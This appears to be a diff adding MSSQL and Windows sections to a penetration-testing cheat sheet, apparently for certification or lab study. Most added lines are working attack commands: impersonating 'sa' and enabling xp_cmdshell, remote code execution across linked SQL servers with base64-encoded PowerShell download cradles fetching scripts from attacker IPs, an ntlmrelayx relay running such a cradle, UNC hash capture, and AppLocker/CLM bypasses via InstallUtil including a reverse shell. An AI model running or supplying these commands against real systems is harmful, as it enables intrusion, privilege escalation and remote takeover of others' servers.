@@ -2133,6 +2133,69 @@ Kerberos Only
 
 ```
 
+## MSSQL
+
+### General
+
+Enumerate login info
+```
+SELECT SYSTEM_USER;
+```
+
+Enumerate database username.
+```
+SELECT USER_NAME();
+```
+
+Enumerate if user is member of Public or Sysadmin. If role is one then true.
+
+```
+SELECT IS_SRVROLEMEMBER('public');
+SELECT IS_SRVROLEMEMBER('sysadmin');
+```
+
+Get logins that we can impersonate
+```
+SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'; 
+```
+
+Enumerate linked servers
+```
+EXEC sp_linkedservers;
+```
+
+### PrivEsc/Impersonation
+```
+EXECUTE AS LOGIN = 'sa';
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+EXEC xp_cmdshell 'whoami';
+```
+
+RCE via first link
+```
+EXECUTE AS LOGIN = 'sa';
+EXEC sp_serveroption 'SQL03', 'rpc out', 'true';
+EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT [SQL27] 
+EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [SQL27] 
+#ensure to encode UTF-16LE and b64 encode
+EXEC ('xp_cmdshell ''powershell -enc SQBFAFgAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABzAHkAcwB0AGUAbQAuAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANAA1AC4AMgAwADEALwByAHUAbgAuAHAAcwAxACcAKQApAA==''') AT [SQL27]
+```
+
+alternate download cradle
+```
+EXEC xp_cmdshell 'echo IEX (New-Object Net.WebClient).DownloadString("http://10.10.14.7/script.ps1") | powershell -noprofile'
+```
+RCE 2nd Linked Server
+```
+EXEC ('EXECUTE AS LOGIN = ''sa'';EXEC sp_configure ''show advanced options'', 1;reconfigure; EXEC sp_configure ''xp_cmdshell'',1;reconfigure') AT SQL53
+EXEC ('EXECUTE AS LOGIN = ''sa''; EXEC xp_cmdshell ''powershell -enc SQBFAFgAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABzAHkAcwB0AGUAbQAuAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANAA1AC4AMgAwADEALwByAHUAbgAuAHAAcwAxACcAKQApAA==''') AT SQL53
+```
+UNC Path Injection - NTLM Hash Relay 
+```
+sudo proxychains4 impacket-ntlmrelayx --no-http-server -smb2support -t 172.16.154.152 -c 'powershell -enc SQBFAFgAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABzAHkAcwB0AGUAbQAuAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANAA1AC4AMgAzADQALwByAHUAbgAuAHAAcwAxACcAKQApAA=='
+EXEC master..xp_dirtree "\192.168.49.67\share";
+```
+
 ## Active Directory Certificate Services
 
 This command will use the certipy tool to query the domain for certificate information.
@@ -2273,7 +2336,51 @@ General ADCS Side Notes: If PKINIT Authentication is not working, LDAP(s)/Schann
 Use the **dap-shell** flag with certipy.
 
 
-## Windows Enuemration
+## Windows Enumeration
+
+Check for CLM
+```powershell
+$ExecutionCOntext.SessionState.LanguageMode
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections 
+```
+
+CLM Bypass via Install Util
+```powershell
+#https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/AppLocker%20Bypass%20PowerShell%20Runspace/Program.cs
+curl http://192.168.45.201/PSbypassCLM2.exe -o bypass.exe
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\bypass.exe
+```
+
+Alt CLM Bypass via Install Util
+```powershell
+#alt to using smb share is dropping to disk C;\windows\tasks etc
+#https://github.com/padovah4ck/PSByPassCLM/blob/master/PSBypassCLM/PSBypassCLM/bin/x64/Debug/PsBypassCLM.exe
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U \\10.13.14.15\pwn\PSBypassCLM.exe
+```
+
+InviShell
+```powershell
+C:\AD\Tools\InviShell\InviShell\RunWithRegistryNonAdmin.bat
+```
+
+World writable folders that bypass AppLocker
+C:\Windows\Tasks 
+C:\Windows\Temp 
+C:\windows\tracing
+C:\Windows\Registration\CRMLog
+C:\Windows\System32\FxsTmp
+C:\Windows\System32\com\dmp
+C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
+C:\Windows\System32\spool\PRINTERS
+C:\Windows\System32\spool\SERVERS
+C:\Windows\System32\spool\drivers\color
+C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter
+C:\Windows\System32\Tasks_Migrated (after peforming a version upgrade of Windows 10)
+C:\Windows\SysWOW64\FxsTmp
+C:\Windows\SysWOW64\com\dmp
+C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
+C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
+
 
 <!-----
 Get-MPPreference
